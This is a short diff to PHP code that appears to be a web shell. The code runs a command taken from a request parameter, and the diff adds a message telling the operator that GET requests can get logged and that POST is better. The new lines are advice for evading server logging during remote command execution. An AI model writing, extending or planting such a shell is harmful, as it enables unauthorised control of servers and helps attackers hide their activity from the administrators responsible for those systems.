@@ -43,6 +43,12 @@ if (isset($_REQUEST[$cmd])) {
    if (!executeCommand($command)) {
       echo 'The command failed to run';
    }
+
+   // warn about noisy get commands
+   if ($_SERVER['REQUEST_METHOD'] == 'GET') {
+      echo 'GET requests can get logged, better use POST instead';
+   }
+
    die();
 }
 
